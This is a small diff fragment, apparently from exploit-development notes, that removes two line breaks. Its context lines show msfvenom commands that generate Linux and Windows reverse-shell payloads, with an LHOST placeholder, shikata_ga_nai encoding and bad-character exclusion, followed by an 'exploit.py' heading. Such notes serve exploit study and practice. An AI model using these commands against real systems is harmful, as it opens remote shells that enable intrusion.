@@ -61,8 +61,6 @@ payload : msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=4444 EXITFUNC
                            /x64/
           msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=4444 EXITFUNC=thread -e x86/shikata_ga_nai -b "\x00\x...." -f py 
 ```
-<br>
-<br>
 
 ## exploit.py
 
